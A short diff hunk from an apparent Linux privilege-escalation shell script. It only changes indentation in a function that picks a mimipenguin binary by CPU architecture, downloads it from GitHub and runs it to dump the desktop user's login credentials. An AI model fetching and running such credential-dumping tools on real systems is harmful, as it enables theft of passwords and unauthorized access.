@@ -299,9 +299,9 @@ escalate(){
 	
 	mimipeng(){
 		if uname -a | grep "i386\|i686"; then
-				downld https://github.com/huntergregal/mimipenguin/raw/master/mimipenguin_x32
+			downld https://github.com/huntergregal/mimipenguin/raw/master/mimipenguin_x32
 		else
-				downld https://github.com/huntergregal/mimipenguin/raw/master/mimipenguin
+			downld https://github.com/huntergregal/mimipenguin/raw/master/mimipenguin
 		fi
 		echo "Mimipenguin: A tool to dump the login/password from the current linux desktop user.."
 		echo "If the screen is blank mimipenguin did not find anything..."
